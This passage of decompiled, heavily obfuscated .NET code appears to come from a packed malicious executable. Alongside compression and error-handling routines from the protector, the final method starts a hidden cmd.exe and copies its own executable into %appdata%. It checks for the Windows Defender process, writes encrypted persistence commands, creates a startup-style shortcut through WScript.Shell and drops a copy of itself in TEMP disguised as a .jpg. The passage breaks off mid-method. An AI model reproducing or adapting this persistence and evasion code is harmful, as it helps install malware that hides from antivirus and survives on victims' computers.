      __Boxed<int> local4 = (ValueType) obj1;
      // ISSUE: variable of a boxed type
      __Boxed<int> local5 = (ValueType) obj0;
      \u0023\u0023.\u0023uk(ex, (object) local1, (object) local2, (object) local3, (object) md, (object) local4, (object) local5);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static bool \u0023Wk()
  {
    try
    {
      \u0023Z.\u00230g obj = new \u0023Z.\u00230g();
      \u0023\u0023.\u0023wi(ref obj);
      return obj.\u0023Qg == (ushort) 9;
    }
    catch
    {
      return false;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static bool \u0023Xk()
  {
    try
    {
      \u0023\u0023.\u0023Qk((\u0023rg) new \u0023Yh());
      return true;
    }
    catch (SecurityException ex1)
    {
      try
      {
        Application.EnableVisualStyles();
        string str = string.Format("{0} cannot initialize itself because some permissions are not granted.\n\nYou probably try to launch {0} in a partial-trust situation. It's usually the case when the application is hosted on a network share.\n\nYou need to run {0} in full-trust, or at least grant it the UnmanagedCode security permission.\n\nTo grant this application the required permission, contact your system administrator, or use the Microsoft .NET Framework Configuration tool.", (object) "vf");
        int num1 = 2;
        \u0023Xh xh;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 2:
              xh = new \u0023Xh(new \u0023nf(str, false));
              goto case 1;
            case 1:
            case 3:
              xh.ShowInTaskbar = true;
              if (true)
              {
                num1 = 4;
                continue;
              }
              goto case 0;
            case 4:
              goto label_7;
            default:
              if (true)
              {
                num1 = 3;
                continue;
              }
              goto label_7;
          }
        }
label_7:
        int num2 = (int) xh.ShowDialog();
      }
      catch (Exception ex2)
      {
        int num = (int) MessageBox.Show(ex2.ToString(), string.Format("{0} Fatal Error", (object) "vf"), MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
      return false;
    }
  }

  [DllImport("kernel32", EntryPoint = "LoadLibraryA", CharSet = CharSet.Ansi, SetLastError = true)]
  internal static extern IntPtr \u0023Yk([MarshalAs(UnmanagedType.VBByRefStr)] ref string _param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  static int \u0023Zk([In] \u0023qc.\u0023md.\u0023Pc obj0)
  {
    int num1;
    int index;
    try
    {
      num1 = 0;
      index = 0;
      int num2 = 3;
label_5:
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 3:
            goto label_2;
          case 1:
          case 2:
            goto label_1;
          case 4:
            goto label_7;
          default:
            num2 = 2;
            continue;
        }
      }
label_1:
      ++index;
label_2:
      while (index >= obj0.\u0023nd.Length)
      {
        if (\u0023\u0023.UBSgn55zIxbZDXest3e())
        {
          num2 = 4;
          goto label_5;
        }
      }
      num1 += (int) obj0.\u0023nd[index] * (int) obj0.\u0023od[index];
      goto label_1;
label_7:
      return num1;
    }
    catch (Exception ex)
    {
      // ISSUE: variable of a boxed type
      __Boxed<int> local1 = (ValueType) num1;
      // ISSUE: variable of a boxed type
      __Boxed<int> local2 = (ValueType) index;
      \u0023qc.\u0023md.\u0023Pc pc = obj0;
      \u0023\u0023.\u0023Dj(ex, (object) local1, (object) local2, (object) pc);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u00230k([In] \u0023qc.\u0023md.\u0023Pc obj0)
  {
    int[] numArray1;
    int num1;
    int index1;
    int index2;
    int num2;
    try
    {
      numArray1 = new int[obj0.\u0023td];
      int num3 = 3;
      if (\u0023\u0023.UBSgn55zIxbZDXest3e())
        goto label_6;
label_1:
      num1 = 0;
      int num4 = 1;
label_5:
      num3 = num4;
label_6:
      switch (num3)
      {
        case 0:
        case 3:
          goto label_1;
        case 1:
          obj0.\u0023rd = new short[obj0.\u0023nd.Length];
          num4 = 6;
          goto label_5;
        case 2:
        case 6:
          for (index1 = 0; index1 < obj0.\u0023td; ++index1)
          {
            numArray1[index1] = num1;
            num1 += obj0.\u0023sd[index1] << 15 - index1;
          }
          goto case 5;
        case 4:
          obj0.\u0023rd[index2] = \u0023\u0023.\u00238h(numArray1[num2 - 1]);
          numArray1[num2 - 1] += 1 << 16 - num2;
          break;
        case 5:
          index2 = 0;
          goto case 7;
        case 7:
          if (index2 >= obj0.\u0023qd)
            return;
          num2 = (int) obj0.\u0023od[index2];
          if (num2 > 0)
          {
            num4 = 4;
            goto label_5;
          }
          else
            break;
        default:
          num4 = 5;
          goto label_5;
      }
      ++index2;
      num4 = 7;
      goto label_5;
    }
    catch (Exception ex)
    {
      int[] numArray2 = numArray1;
      // ISSUE: variable of a boxed type
      __Boxed<int> local1 = (ValueType) num1;
      // ISSUE: variable of a boxed type
      __Boxed<int> local2 = (ValueType) index1;
      // ISSUE: variable of a boxed type
      __Boxed<int> local3 = (ValueType) index2;
      // ISSUE: variable of a boxed type
      __Boxed<int> local4 = (ValueType) num2;
      \u0023qc.\u0023md.\u0023Pc pc = obj0;
      \u0023\u0023.\u0023uk(ex, (object) numArray2, (object) local1, (object) local2, (object) local3, (object) local4, (object) pc);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static int \u00231k([In] byte[] obj0, [In] \u0023qc.\u0023bd obj1)
  {
    int num1;
    int length;
    int num2;
    int num3;
    int num4;
    int num5;
    try
    {
      num1 = 0;
      length = obj0.Length;
      int num6 = 1;
      while (true)
      {
        \u0023qc.\u0023Jd ad;
        bool flag1;
        bool flag2;
        int num7;
        switch (num6)
        {
          case 0:
          case 1:
            num2 = length;
            goto case 9;
          case 2:
            length -= num3;
            num7 = 8;
            break;
          case 3:
            goto label_22;
          case 4:
            num1 += num3;
            obj1.\u00238c += (long) num3;
            num6 = 2;
            continue;
          case 5:
            if (!\u0023\u0023.\u0023fl(flag2, ad, flag1))
            {
              if (obj1.\u00237c == 16)
              {
                num4 = num2 - length;
                num6 = 3;
                continue;
              }
              if (obj1.\u00237c != 20)
              {
                if (obj1.\u00237c == 28)
                {
                  \u0023\u0023.\u0023Qj(obj1.\u00239c);
                  obj1.\u00237c = 30;
                  num6 = 9;
                  continue;
                }
                goto case 9;
              }
              else
              {
                num5 = 8 + (-\u0023\u0023.\u0023mi(obj1.\u00239c) & 7);
                num6 = 7;
                continue;
              }
            }
            else
              goto case 9;
          case 6:
          case 7:
            for (; num5 > 0; num5 -= 10)
              \u0023\u0023.\u0023kk(obj1.\u00239c, 2, 10);
            obj1.\u00237c = 16;
            goto case 9;
          case 8:
            if (length != 0 && obj1.\u00237c != 30)
            {
              ad = obj1.\u0023ad;
              flag1 = (obj1.\u00237c & 4) != 0;
              flag2 = (obj1.\u00237c & 8) != 0;
              goto case 5;
            }
            else
              goto label_20;
          case 9:
            num3 = \u0023\u0023.\u0023Vj(obj1.\u00239c, obj0, num1, length);
            num6 = 4;
            continue;
          default:
            num7 = 5;
            break;
        }
        num6 = num7;
      }
label_20:
      num4 = num2 - length;
    }
    catch (Exception ex)
    {
      // ISSUE: variable of a boxed type
      __Boxed<int> local1 = (ValueType) num1;
      // ISSUE: variable of a boxed type
      __Boxed<int> local2 = (ValueType) length;
      // ISSUE: variable of a boxed type
      __Boxed<int> local3 = (ValueType) num2;
      // ISSUE: variable of a boxed type
      __Boxed<int> local4 = (ValueType) num3;
      // ISSUE: variable of a boxed type
      __Boxed<int> local5 = (ValueType) num5;
      \u0023qc.\u0023bd bd = obj1;
      byte[] numArray = obj0;
      \u0023\u0023.\u00233k(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) local5, (object) bd, (object) numArray);
      throw;
    }
label_22:
    return num4;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static bool \u00232k([In] int obj0, [In] \u0023qc.\u0023Jd obj1)
  {
    int num1;
    int num2;
    int cd;
    int num3;
    int index;
    byte num4;
    byte num5;
    short[] xd;
    int num6;
    int val1;
    int num7;
    try
    {
      num1 = 128;
      num2 = 128;
      int num8 = 0;
      while (true)
      {
        int num9;
        switch (num8)
        {
          case 0:
            xd = obj1.\u0023xd;
            if (true)
            {
              num8 = 6;
              continue;
            }
            goto label_28;
          case 1:
            num5 = obj1.\u0023Hc[index];
            break;
          case 2:
            if ((int) obj1.\u0023Hc[++cd] == (int) obj1.\u0023Hc[++num3])
            {
              num9 = 7;
              goto label_16;
            }
            else
              goto case 11;
          case 3:
          case 8:
            num4 = obj1.\u0023Hc[index - 1];
            num8 = 1;
            continue;
          case 4:
          case 7:
            if ((int) obj1.\u0023Hc[++cd] != (int) obj1.\u0023Hc[++num3] || (int) obj1.\u0023Hc[++cd] != (int) obj1.\u0023Hc[++num3] || cd >= num7)
              goto case 11;
            else
              goto label_25;
          case 5:
            if ((int) obj1.\u0023Hc[++cd] == (int) obj1.\u0023Hc[++num3] && (int) obj1.\u0023Hc[++cd] == (int) obj1.\u0023Hc[++num3] && (int) obj1.\u0023Hc[++cd] == (int) obj1.\u0023Hc[++num3] && (int) obj1.\u0023Hc[++cd] == (int) obj1.\u0023Hc[++num3])
            {
              if (true)
              {
                num8 = 2;
                continue;
              }
              goto case 3;
            }
            else
              goto case 11;
          case 6:
            cd = obj1.\u0023Cd;
            index = obj1.\u0023Cd + obj1.\u0023zd;
            val1 = Math.Max(obj1.\u0023zd, 2);
            num6 = Math.Max(obj1.\u0023Cd - 32506, 0);
            num7 = obj1.\u0023Cd + 258 - 1;
            num4 = obj1.\u0023Hc[index - 1];
            num5 = obj1.\u0023Hc[index];
            if (val1 >= 8)
              num1 >>= 2;
            if (num2 > obj1.\u0023Dd)
            {
              num2 = obj1.\u0023Dd;
              goto label_23;
            }
            else
              goto label_23;
          case 9:
            val1 = cd - obj1.\u0023Cd;
            if (val1 < num2)
            {
              num9 = 3;
              goto label_16;
            }
            else
              goto label_12;
          case 10:
            index = cd;
            num9 = 9;
            goto label_16;
          case 11:
label_7:
            if (cd > index)
            {
              obj1.\u0023yd = obj0;
              num9 = 10;
              goto label_16;
            }
            else
              break;
          case 12:
            goto label_28;
          default:
            num9 = 11;
            goto label_16;
        }
        cd = obj1.\u0023Cd;
label_11:
        if ((obj0 = (int) xd[obj0 & (int) short.MaxValue] & (int) ushort.MaxValue) > num6 && --num1 != 0)
          goto label_23;
label_12:
        obj1.\u0023zd = Math.Min(val1, obj1.\u0023Dd);
        num9 = 12;
label_16:
        num8 = num9;
        continue;
label_23:
        if ((int) obj1.\u0023Hc[obj0 + val1] == (int) num5 && (int) obj1.\u0023Hc[obj0 + val1 - 1] == (int) num4 && (int) obj1.\u0023Hc[obj0] == (int) obj1.\u0023Hc[cd] && (int) obj1.\u0023Hc[obj0 + 1] == (int) obj1.\u0023Hc[cd + 1])
        {
          num3 = obj0 + 2;
          cd += 2;
        }
        else
          goto label_11;
label_25:
        if ((int) obj1.\u0023Hc[++cd] == (int) obj1.\u0023Hc[++num3])
        {
          num9 = 5;
          goto label_16;
        }
        else
          goto label_7;
      }
label_28:
      return obj1.\u0023zd >= 3;
    }
    catch (Exception ex)
    {
      object[] objArray = new object[13]
      {
        (object) num1,
        (object) num2,
        (object) xd,
        (object) cd,
        (object) num3,
        (object) index,
        (object) val1,
        (object) num6,
        (object) num7,
        (object) num4,
        (object) num5,
        (object) obj1,
        (object) obj0
      };
      \u0023\u0023.\u0023ji(ex, objArray);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u00233k(
    [In] Exception obj0,
    [In] object obj1,
    [In] object obj2,
    [In] object obj3,
    [In] object obj4,
    [In] object obj5,
    [In] object obj6,
    [In] object obj7)
  {
    \u0023\u0023.\u0023ji(obj0, new object[7]
    {
      obj1,
      obj2,
      obj3,
      obj4,
      obj5,
      obj6,
      obj7
    });
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static string \u00234k([In] string obj0) => obj0.StartsWith("\"<RSAKeyValue>") && obj0.EndsWith("</RSAKeyValue>\"") ? "*** Information not reported for security reasons ***" : obj0;

  [MethodImpl(MethodImplOptions.NoInlining)]
  static int \u00235k([In] \u0023Te obj0, [In] \u0023Te.\u00234e obj1)
  {
    int num1 = 5;
    string upper;
    int count;
    while (true)
    {
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 3:
            goto label_4;
          case 1:
          case 2:
            if (!obj0.\u0023Fe.ContainsKey(upper))
            {
              count = obj0.\u0023Ee.Count;
              if (!\u0023\u0023.XPxp2PwLL1BPJh1nWga())
              {
                num2 = 4;
                continue;
              }
              goto label_4;
            }
            else
              goto label_2;
          case 4:
            goto label_5;
          case 5:
            upper = obj1.\u00230e.\u0023Ye.ToUpper();
            num2 = 2;
            continue;
          case 6:
            goto label_10;
          default:
            num2 = 0;
            continue;
        }
      }
label_4:
      obj0.\u0023Fe.Add(upper, count);
      num1 = 6;
      continue;
label_5:
      obj0.\u0023Ee.Add(obj1.\u00230e);
      goto label_4;
    }
label_2:
    return obj0.\u0023Fe[upper];
label_10:
    return count;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u00236k([In] \u0023qc.\u0023md obj0)
  {
    int index;
    int num1;
    int num2;
    int num3;
    int num4;
    int num5;
    try
    {
      index = 0;
      while (true)
      {
        int num6;
        if (index < obj0.\u0023gd)
        {
          num1 = (int) obj0.\u0023fd[index] & (int) byte.MaxValue;
          num6 = 3;
        }
        else
          num6 = 7;
        while (true)
        {
          int num7 = num6;
          while (true)
          {
            switch (num7)
            {
              case 0:
              case 3:
                goto label_14;
              case 1:
                \u0023\u0023.\u0023kk(obj0.\u00239c, num1 & (1 << num3) - 1, num3);
                break;
              case 2:
label_16:
                if (num3 > 0)
                {
                  num7 = 5;
                  continue;
                }
                goto label_6;
              case 4:
              case 5:
                goto label_4;
              case 6:
                num3 = (num2 - 261) / 4;
                if (num3 <= 0 || num3 > 5)
                  break;
                goto label_3;
              case 7:
                goto label_18;
              default:
                num7 = 2;
                continue;
            }
            num5 = \u0023\u0023.\u0023gj(obj0, num4);
            \u0023\u0023.\u00239i(obj0.\u0023Fc, num5);
            num3 = num5 / 2 - 1;
            goto label_16;
          }
label_3:
          num6 = 1;
          continue;
label_14:
          num4 = (int) obj0.\u0023ed[index];
          if (num4-- != 0)
          {
            num2 = \u0023\u0023.\u0023sj(num1, obj0);
            \u0023\u0023.\u00239i(obj0.\u0023dd, num2);
            num6 = 6;
          }
          else
            goto label_5;
        }
label_4:
        \u0023\u0023.\u0023kk(obj0.\u00239c, num4 & (1 << num3) - 1, num3);
        goto label_6;
label_5:
        \u0023\u0023.\u00239i(obj0.\u0023dd, num1);
label_6:
        ++index;
      }
label_18:
      \u0023\u0023.\u00239i(obj0.\u0023dd, 256);
    }
    catch (Exception ex)
    {
      // ISSUE: variable of a boxed type
      __Boxed<int> local1 = (ValueType) index;
      // ISSUE: variable of a boxed type
      __Boxed<int> local2 = (ValueType) num1;
      // ISSUE: variable of a boxed type
      __Boxed<int> local3 = (ValueType) num4;
      // ISSUE: variable of a boxed type
      __Boxed<int> local4 = (ValueType) num2;
      // ISSUE: variable of a boxed type
      __Boxed<int> local5 = (ValueType) num3;
      // ISSUE: variable of a boxed type
      __Boxed<int> local6 = (ValueType) num5;
      \u0023qc.\u0023md md = obj0;
      \u0023\u0023.\u00233k(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) local5, (object) local6, (object) md);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u00237k(
    [In] Exception obj0,
    [In] object obj1,
    [In] object obj2,
    [In] object obj3,
    [In] object obj4,
    [In] object obj5,
    [In] object obj6,
    [In] object obj7,
    [In] object obj8,
    [In] object obj9,
    [In] object obj10)
  {
    \u0023\u0023.\u0023ji(obj0, new object[10]
    {
      obj1,
      obj2,
      obj3,
      obj4,
      obj5,
      obj6,
      obj7,
      obj8,
      obj9,
      obj10
    });
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u00238k([In] byte[] obj0, [In] int obj1, [In] \u0023qc.\u0023md obj2, [In] bool obj3, [In] int obj4)
  {
    int index1;
    int index2;
    int hd;
    int num1;
    int index3;
    int num2;
    try
    {
      ++obj2.\u0023dd.\u0023nd[256];
      int num3 = 7;
      while (true)
      {
        int num4 = num3;
        \u0023qc.\u0023md.\u0023Pc fc;
        while (true)
        {
          switch (num4)
          {
            case 0:
            case 1:
              goto label_5;
            case 2:
              goto label_8;
            case 3:
            case 10:
              goto label_23;
            case 4:
              \u0023\u0023.\u0023jl(\u0023qc.\u0023md.\u0023kd, \u0023qc.\u0023md.\u0023ld, fc);
              \u0023\u0023.\u00236k(obj2);
              \u0023\u0023.\u00237h(obj2);
              int num5 = 9;
              num4 = \u0023\u0023.XPxp2PwLL1BPJh1nWga() ? num5 : num5;
              continue;
            case 5:
              \u0023\u0023.\u00238i(obj2, num1);
              if (true)
              {
                num4 = 3;
                continue;
              }
              goto case 4;
            case 6:
              ++index2;
              break;
            case 7:
              \u0023\u0023.\u00235j(obj2.\u0023dd);
              if (true)
              {
                num4 = 0;
                continue;
              }
              goto case 11;
            case 8:
              goto label_28;
            case 9:
              goto label_11;
            case 11:
              if (index1 >= 286)
              {
                index2 = 0;
                break;
              }
              hd += (int) obj2.\u0023dd.\u0023nd[index1] * (int) \u0023qc.\u0023md.\u0023jd[index1];
              ++index1;
              if (true)
              {
                num4 = 11;
                continue;
              }
              goto case 5;
            case 12:
              hd = obj2.\u0023hd;
              index1 = 0;
              goto case 11;
            case 13:
              goto label_29;
            default:
              num4 = 8;
              continue;
          }
          if (index2 < 30)
          {
            hd += (int) obj2.\u0023Fc.\u0023nd[index2] * (int) \u0023qc.\u0023md.\u0023ld[index2];
            int num6 = 6;
            num4 = \u0023\u0023.XPxp2PwLL1BPJh1nWga() ? num6 : num6;
          }
          else
            goto label_15;
        }
label_5:
        \u0023\u0023.\u00235j(obj2.\u0023Fc);
        \u0023\u0023.\u00233j(obj2.\u0023dd, obj2.\u0023Xc);
        \u0023\u0023.\u00233j(obj2.\u0023Fc, obj2.\u0023Xc);
        \u0023\u0023.\u00235j(obj2.\u0023Xc);
        num1 = 4;
        index3 = 18;
        goto label_9;
label_8:
        --index3;
label_9:
        if (index3 > num1)
        {
          if (obj2.\u0023Xc.\u0023od[\u0023qc.\u0023md.\u00235c[index3]] > (byte) 0)
          {
            num1 = index3 + 1;
            num3 = 2;
            continue;
          }
          goto label_8;
        }
        else
        {
          num2 = 14 + num1 * 3 + \u0023\u0023.\u0023Zk(obj2.\u0023Xc) + \u0023\u0023.\u0023Zk(obj2.\u0023dd) + \u0023\u0023.\u0023Zk(obj2.\u0023Fc) + obj2.\u0023hd;
          num3 = 12;
          continue;
        }
label_15:
        if (num2 >= hd)
          num2 = hd;
        if (obj4 < 0 || obj1 + 4 >= num2 >> 3)
        {
          if (num2 != hd)
          {
            \u0023\u0023.\u0023kk(obj2.\u00239c, 4 + (obj3 ? 1 : 0), 3);
            num3 = 5;
            continue;
          }
          goto label_28;
        }
        else
          break;
label_23:
        \u0023\u0023.\u00236k(obj2);
        num3 = 13;
        continue;
label_28:
        \u0023\u0023.\u0023kk(obj2.\u00239c, 2 + (obj3 ? 1 : 0), 3);
        \u0023qc.\u0023md.\u0023Pc dd = obj2.\u0023dd;
        \u0023\u0023.\u0023jl(\u0023qc.\u0023md.\u0023id, \u0023qc.\u0023md.\u0023jd, dd);
        fc = obj2.\u0023Fc;
        num3 = 4;
      }
      \u0023\u0023.\u0023Gk(obj0, obj3, obj4, obj2, obj1);
      return;
label_11:
      return;
label_29:
      \u0023\u0023.\u00237h(obj2);
    }
    catch (Exception ex)
    {
      object[] objArray = new object[11]
      {
        (object) num1,
        (object) index3,
        (object) num2,
        (object) hd,
        (object) index1,
        (object) index2,
        (object) obj2,
        (object) obj0,
        (object) obj4,
        (object) obj1,
        (object) obj3
      };
      \u0023\u0023.\u0023ji(ex, objArray);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u00239k()
  {
    try
    {
      try
      {
        AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(\u0023\u0023.\u0023Tk);
      }
      catch
      {
      }
    }
    catch (Exception ex)
    {
      \u0023\u0023.\u00236i(ex);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023al()
  {
label_0:
    int num1;
    int num2;
    string str1;
    string str2;
    Process process;
    string str3;
    object executablePath;
    string[] strArray1;
    string str4;
    StreamWriter standardInput;
    string str5;
    string str6;
    string str7;
    string str8;
    string str9;
    string str10;
    object objectValue1;
    object[] objArray1;
    object objectValue2;
    object[] objArray2;
    object Instance1;
    string[] strArray2;
    int num3;
    try
    {
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        num2 = 2;
        str1 = "" + Interaction.Environ(\u0023\u0023.\u0023ei("5g+BxFHXkdTcEM3cEGgk0A==")) + \u0023\u0023.\u0023ei("923lYoAhb2vVXIM6u3MCzjKugVDBXZMcbb6ThbsL5r8=") + "";
label_2:
        num2 = 3;
        str2 = Interaction.Environ(\u0023\u0023.\u0023ei("5g+BxFHXkdTcEM3cEGgk0A==")) + \u0023\u0023.\u0023ei("sscpRZTSpuugDgOvmaPPPu6b/X9gZRYeKcyavwZ3WPM=");
label_3:
        num2 = 4;
        process = new Process();
label_4:
        num2 = 5;
        str3 = Interaction.Environ(\u0023\u0023.\u0023ei("5g+BxFHXkdTcEM3cEGgk0A==")) + \u0023\u0023.\u0023ei("sscpRZTSpuugDgOvmaPPPu6b/X9gZRYeKcyavwZ3WPM=") + \u0023\u0023.\u0023ei("iXIzM98Pjl/u+zlU/h5Dfl19cMP29BJLIWFLWajNT92OKqOYE9q1PcctiVmnH8Ed") + \u0023\u0023.\u0023ei("/Ua4ADIj2BcZDlY+KZNNuw==");
label_5:
        num2 = 6;
        Directory.CreateDirectory(str2 + \u0023\u0023.\u0023ei("GnEv8+RLHTy6DbiOjusZHA=="));
label_6:
        num2 = 7;
        executablePath = (object) Application.ExecutablePath;
label_7:
        num2 = 8;
        strArray1 = new string[6]
        {
          "",
          Interaction.Environ(\u0023\u0023.\u0023ei("5g+BxFHXkdTcEM3cEGgk0A==")),
          \u0023\u0023.\u0023ei("923lYoAhb2vVXIM6u3MCzjKugVDBXZMcbb6ThbsL5r8="),
          \u0023\u0023.\u0023ei("GnEv8+RLHTy6DbiOjusZHA=="),
          "\\",
          \u0023\u0023.\u0023ei("/Ua4ADIj2BcZDlY+KZNNuw==")
        };
        str4 = string.Concat(strArray1);
label_8:
        num2 = 9;
        process.StartInfo.FileName = "cmd.exe";
label_9:
        num2 = 10;
        process.StartInfo.RedirectStandardOutput = true;
label_10:
        num2 = 11;
        process.StartInfo.RedirectStandardInput = true;
label_11:
        num2 = 12;
        process.StartInfo.UseShellExecute = false;
label_12:
        num2 = 13;
        process.StartInfo.CreateNoWindow = true;
label_13:
        num2 = 14;
        process.StartInfo.RedirectStandardError = true;
label_14:
        num2 = 15;
        process.Start();
label_15:
        num2 = 16;
        standardInput = process.StandardInput;
label_16:
        num2 = 17;
        str5 = "cop";
label_17:
        num2 = 18;
        str6 = "y ";
label_18:
        num2 = 19;
        standardInput.AutoFlush = true;
label_19:
        num2 = 20;
        str7 = "%appdata%\\";
label_20:
        num2 = 21;
        str8 = ".lnk";
label_21:
        num2 = 22;
        StreamWriter streamWriter1 = standardInput;
        strArray1 = new string[11]
        {
          str5,
          str6,
          "\"",
          Application.ExecutablePath,
          "\" \"",
          str7,
          \u0023\u0023.\u0023ei("GnEv8+RLHTy6DbiOjusZHA=="),
          "\\",
          \u0023\u0023.\u0023ei("/Ua4ADIj2BcZDlY+KZNNuw=="),
          "\" /Y",
          Environment.NewLine
        };
        string str11 = string.Concat(strArray1);
        streamWriter1.Write(str11);
label_22:
        num2 = 23;
        if (!\u0023\u0023.\u00232h("MsMpEng"))
          goto label_25;
label_23:
        num2 = 24;
        StreamWriter streamWriter2 = standardInput;
        strArray1 = new string[7]
        {
          \u0023\u0023.\u0023ei("04gH48xsNOUf+H7cCLcQbtVo+n2CPnhoK4m4jmlO9kUKlPfgFZIYHte5sEFXVfO17fYxlnA2aVC5aaTAAEGBlnIXKfM49/5SbjLev7dUVnTkJKF7YnQ/Aj9mLKSIhAHV"),
          str7,
          \u0023\u0023.\u0023ei("GnEv8+RLHTy6DbiOjusZHA=="),
          "\\",
          \u0023\u0023.\u0023ei("/Ua4ADIj2BcZDlY+KZNNuw=="),
          "\" /f",
          Environment.NewLine
        };
        string str12 = string.Concat(strArray1);
        streamWriter2.Write(str12);
label_24:
        num2 = 25;
        Thread.Sleep(7000);
        goto label_38;
label_25:
        num2 = 27;
label_26:
        num2 = 28;
        StreamWriter streamWriter3 = standardInput;
        strArray1 = new string[8]
        {
          \u0023\u0023.\u0023ei("04gH48xsNOUf+H7cCLcQbtVo+n2CPnhoK4m4jmlO9kUKlPfgFZIYHte5sEFXVfO17fYxlnA2aVC5aaTAAEGBlnIXKfM49/5SbjLev7dUVnTkJKF7YnQ/Aj9mLKSIhAHV"),
          str7,
          \u0023\u0023.\u0023ei("GnEv8+RLHTy6DbiOjusZHA=="),
          "\\",
          \u0023\u0023.\u0023ei("/Ua4ADIj2BcZDlY+KZNNuw=="),
          str8,
          "\" /f",
          Environment.NewLine
        };
        string str13 = string.Concat(strArray1);
        streamWriter3.Write(str13);
label_27:
        num2 = 29;
        str9 = "WScrip";
label_28:
        num2 = 30;
        str10 = str9 + "t.Shell";
label_29:
        num2 = 31;
        objectValue1 = RuntimeHelpers.GetObjectValue(Interaction.CreateObject(""));
label_30:
        num2 = 32;
        objectValue1 = RuntimeHelpers.GetObjectValue(Interaction.CreateObject(str9 + "t.Shell"));
label_31:
        num2 = 33;
        object Instance2 = objectValue1;
        objArray1 = new object[1];
        object[] objArray3 = objArray1;
        strArray1 = new string[5]
        {
          str2,
          \u0023\u0023.\u0023ei("GnEv8+RLHTy6DbiOjusZHA=="),
          "\\",
          \u0023\u0023.\u0023ei("/Ua4ADIj2BcZDlY+KZNNuw=="),
          str8
        };
        string str14 = string.Concat(strArray1);
        objArray3[0] = (object) str14;
        object[] Arguments1 = objArray1;
        objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(Instance2, (System.Type) null, "CreateShortcut", Arguments1, (string[]) null, (System.Type[]) null, (bool[]) null));
label_32:
        num2 = 34;
        object Instance3 = objectValue2;
        objArray2 = new object[1];
        object[] objArray4 = objArray2;
        object Instance4 = objectValue1;
        objArray1 = new object[1]
        {
          (object) (str2 + \u0023\u0023.\u0023ei("GnEv8+RLHTy6DbiOjusZHA==") + "\\" + \u0023\u0023.\u0023ei("/Ua4ADIj2BcZDlY+KZNNuw=="))
        };
        object[] Arguments2 = objArray1;
        object objectValue3 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(Instance4, (System.Type) null, "ExpandEnvironmentStrings", Arguments2, (string[]) null, (System.Type[]) null, (bool[]) null));
        objArray4[0] = objectValue3;
        object[] Arguments3 = objArray2;
        NewLateBinding.LateSet(Instance3, (System.Type) null, "TargetPath", Arguments3, (string[]) null, (System.Type[]) null);
label_33:
        num2 = 35;
        object Instance5 = Instance1;
        objArray1 = new object[1];
        object[] objArray5 = objArray1;
        object Instance6 = objectValue1;
        objArray2 = new object[1]
        {
          (object) (str2 + \u0023\u0023.\u0023ei("GnEv8+RLHTy6DbiOjusZHA==") + "\\" + \u0023\u0023.\u0023ei("/Ua4ADIj2BcZDlY+KZNNuw=="))
        };
        object[] Arguments4 = objArray2;
        object objectValue4 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(Instance6, (System.Type) null, "ExpandEnvironmentStrings", Arguments4, (string[]) null, (System.Type[]) null, (bool[]) null));
        objArray5[0] = objectValue4;
        object[] Arguments5 = objArray1;
        NewLateBinding.LateSet(Instance5, (System.Type) null, "TargetPath", Arguments5, (string[]) null, (System.Type[]) null);
label_34:
        num2 = 36;
        object Instance7 = objectValue2;
        objArray2 = new object[1]{ (object) 4 };
        object[] Arguments6 = objArray2;
        NewLateBinding.LateSet(Instance7, (System.Type) null, "WindowStyle", Arguments6, (string[]) null, (System.Type[]) null);
label_35:
        num2 = 37;
        NewLateBinding.LateCall(objectValue2, (System.Type) null, "Save", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
label_36:
        num2 = 38;
        NewLateBinding.LateCall(Instance1, (System.Type) null, "Save", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
label_37:
        num2 = 39;
        StreamWriter streamWriter4 = standardInput;
        strArray1 = new string[7]
        {
          \u0023\u0023.\u0023ei("tooEKUPNPCsRNkaS3Hueqar3hTgD3+UMaiKlVz9fNin2nXZ/+dc8OLhhu6kefhMV"),
          str7,
          \u0023\u0023.\u0023ei("GnEv8+RLHTy6DbiOjusZHA=="),
          "\\",
          \u0023\u0023.\u0023ei("/Ua4ADIj2BcZDlY+KZNNuw=="),
          \u0023\u0023.\u0023ei("N2125ojyLfd5vRuYzSjpwfaddn/51zw4uGG7qR5+ExU="),
          Environment.NewLine
        };
        string str15 = string.Concat(strArray1);
        streamWriter4.Write(str15);
label_38:
        num2 = 41;
        strArray1 = new string[5]
        {
          Interaction.Environ("TEMP"),
          "\\",
          \u0023\u0023.\u0023ei("GnEv8+RLHTy6DbiOjusZHA=="),
          "\\",
          \u0023\u0023.\u0023ei("/Ua4ADIj2BcZDlY+KZNNuw==")
        };
        if (System.IO.File.Exists(string.Concat(strArray1)))
          goto label_41;
label_39:
        num2 = 42;
        string sourceFileName = Conversions.ToString(executablePath);
        strArray2 = new string[6]
        {
          Interaction.Environ("TEMP"),
          "\\",
          \u0023\u0023.\u0023ei("GnEv8+RLHTy6DbiOjusZHA=="),
          "\\",
          \u0023\u0023.\u0023ei("/Ua4ADIj2BcZDlY+KZNNuw=="),
          ".jpg"
        };
        string destFileName = string.Concat(strArray2);
        System.IO.File.Copy(sourceFileName, destFileName);
label_40:
